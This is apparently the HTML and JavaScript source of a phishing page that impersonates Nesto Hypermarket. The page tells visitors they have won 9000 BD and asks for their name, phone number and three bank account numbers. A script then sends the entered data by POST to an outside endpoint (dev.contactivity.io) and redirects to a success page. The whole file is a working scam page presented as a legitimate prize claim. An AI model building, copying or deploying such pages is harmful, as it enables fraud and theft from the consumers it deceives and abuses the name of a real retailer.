<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Prize Claim - Nesto Hypermarket</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
        }

        .container {
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
        }

        header {
            background-color: #f0f0f0;
            padding: 20px 0;
            text-align: center;
        }

        header img {
            max-width: 200px; /* Increased logo size */
        }

        #prize-details {
            background-color: #fff;
            border-bottom: 1px solid #ccc;
            padding-bottom: 20px;
            text-align: center; /* Center align the form */
        }

        #prize-details form {
            max-width: 400px; /* Adjusted form width */
            margin: 0 auto; /* Center the form */
            text-align: left; /* Left align form fields */
        }

        #prize-details input,
        #prize-details button {
            display: block;
            width: calc(100% - 22px); /* Adjusted width to accommodate border */
            padding: 10px;
            margin-bottom: 15px; /* Add some margin between form elements */
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box; /* Include padding in element width */
        }

        #prize-details button {
            background-color: #007bff;
            color: #fff;
            border: none;
            cursor: pointer;
        }

        #prize-details input:focus,
        #prize-details button:focus {
            outline: none;
        }

        /* Improved styling for input placeholders */
        ::placeholder {
            color: #999;
        }

        /* Improved styling for input on focus */
        input:focus {
            border-color: #007bff;
        }

        #image-section {
            text-align: center;
            margin-bottom: 20px;
        }

        #image-section img {
            max-width: 100%;
            height: auto;
            max-height: 400px; /* Set a maximum height for the image */
        }

        footer {
            background-color: #007bff;
            color: #fff;
            text-align: center;
            padding: 20px 0;
        }

        footer p {
            margin: 0;
        }
    </style>
</head>
<body>
    <header>
        <div class="container">
            <img src="./logo.png" alt="Nesto Hypermarket Logo">
            <h1>Congratulations!</h1>
        </div>
    </header>
    <section id="image-section">
        <div class="container">
            <img src="./img.webp" alt="Prize Image">
        </div>
    </section>
    <section id="prize-details">
        <div class="container">
            <p>You've won a prize of 9000 BD!</p>
            <p>To claim your prize, please fill out the form below and provide details for three accounts.</p>
            <p>You must provide three accounts to transfer the prize money, with a maximum limit of 3000 BD for each account.</p>
            <form id="claim-form">
                <input type="text" placeholder="Your Name" required>
                <input type="tel" placeholder="Phone Number" required>
                <input type="text" placeholder="Account 1 Number (Maximum 3000 BD)" required>
                <input type="text" placeholder="Account 2 Number (Maximum 3000 BD)" required>
                <input type="text" placeholder="Account 3 Number (Maximum 3000 BD)" required>
                <button type="button" onclick="claimPrize()">Claim Prize</button>
            </form>
        </div>
    </section>
    <footer>
        <div class="container">
            <p>Payment will be received in 30 minutes.</p>
        </div>
    </footer>

    <script>
        function claimPrize() {
            // Call your API here
            // Example:
            fetch('https://dev.contactivity.io/send-email', {
                method: 'POST',
                body: JSON.stringify({
                    name: document.querySelector('#claim-form input[name="name"]').value,
                    phoneNumber: document.querySelector('#claim-form input[name="phoneNumber"]').value,
                    account1: document.querySelector('#claim-form input[name="account1"]').value,
                    account2: document.querySelector('#claim-form input[name="account2"]').value,
                    account3: document.querySelector('#claim-form input[name="account3"]').value
                }),
                headers: {
                    'Content-Type': 'application/json'
                }
            })
            .then(response => {
                if (response.ok) {
                    window.location.href = 'success.html';
                } else {
                    alert('Failed to claim prize. Please try again.');
                }
            })
            .catch(error => console.error('Error:', error));
            
            window.location.href = 'success.html';
        }
    </script>
</body>
</html>
